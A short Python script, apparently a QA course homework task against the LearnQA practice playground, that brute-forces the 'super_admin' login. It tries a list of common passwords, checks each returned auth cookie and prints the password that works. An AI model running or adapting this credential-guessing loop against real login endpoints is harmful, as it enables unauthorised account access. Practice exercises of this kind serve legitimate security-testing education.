import requests
url_get = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url_check = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

found_flag = False
passwords = ['solo', 'jesus', '123456789', 'donald', 'iloveyou', 'welcome', 'letmein', '!@#$%^&*', 'zaq1zaq1', 'bailey',
             'baseball', 'loveme', '12345', 'passw0rd', '666666', 'qwerty123', 'batman', '1234567890', 'qwertyuiop',
             'freedom', '1234', 'sunshine', 'trustno1', 'whatever', 'abc123', '111111', 'flower', 'aa123456', '121212',
             'password1', 'hello', 'charlie', '1q2w3e4r', 'master', 'princess', '123qwe', '123123', 'login', 'michael',
             'football', '654321', '1234567', 'ashley', 'admin', 'monkey', 'password', 'mustang', '1qaz2wsx', 'access',
             'hottie', '888888', 'starwars', '123456', 'Football', 'adobe123', 'photoshop', 'qwerty', 'superman',
             '696969', 'lovely', 'shadow', '555555', 'ninja', 'dragon', '7777777', '000000', 'azerty', '12345678', 'qazwsx']

for password in passwords:
    payload = {"login":"super_admin", "password":password}
    response_get = requests.post(url_get, data=payload)
    cookies = dict(response_get.cookies)
    response_check = requests.post(url_check, cookies = cookies)
    if response_check.text != "You are NOT authorized":
        print(f"Correct password : {password}")
        print(response_check.text)
        found_flag = True
        break

if not found_flag:
    print("There isn`t correct password in list")